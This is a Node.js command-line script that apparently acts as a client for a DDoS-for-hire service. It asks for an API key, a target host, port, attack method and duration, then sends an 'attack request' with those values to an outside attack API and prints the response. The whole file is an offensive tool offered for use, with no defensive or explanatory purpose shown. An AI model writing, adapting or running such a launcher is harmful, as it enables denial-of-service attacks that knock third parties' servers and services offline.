import readline from "readline";
import axios from "axios";
import chalk from "chalk";
import gradient from "gradient-string";

console.clear();
console.log(
  gradient.pastel(
    "\n*******************************************\n" +
      "*            Made by S P A C E  V I N    *\n" +
      "*               SPACE NETWORK             *\n" +
      "*******************************************\n"
  )
);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const apiManager = async () => {
  const prompt = (query) =>
    new Promise((resolve) => rl.question(gradient.morning(query), resolve));

  try {
    console.log(gradient.summer("\nWelcome to the API Manager\n"));

    const username = await prompt("Enter Username: ");
    const apiKey = await prompt("Enter Key: ");
    const target = await prompt("Target: ");
    const port = await prompt("Port: ");
    const method = await prompt("Method: ");
    const time = await prompt("Time (in seconds): ");

    console.log(gradient.cristal("\nSending your attack request...\n"));

    const apiUrl = `http://spaaacelink/apissaa/attack?username=${username}&key=${apiKey}&host=${target}&port=${port}&time=${time}&method=${method}`;

    console.log(gradient.atlas("\nAPI Request URL:\n") + chalk.cyan(apiUrl));

    const response = await axios.get(apiUrl);

    if (response.data) {
      console.log(gradient.fruit("\nResponse: " + JSON.stringify(response.data, null, 2)));
    } else {
      console.log(chalk.red("\nError: Unexpected API response."));
    }
  } catch (error) {
    console.error(
      chalk.red("\nAn error occurred: " + (error.response?.data || error.message))
    );
  } finally {
    rl.close();
  }
};

apiManager();
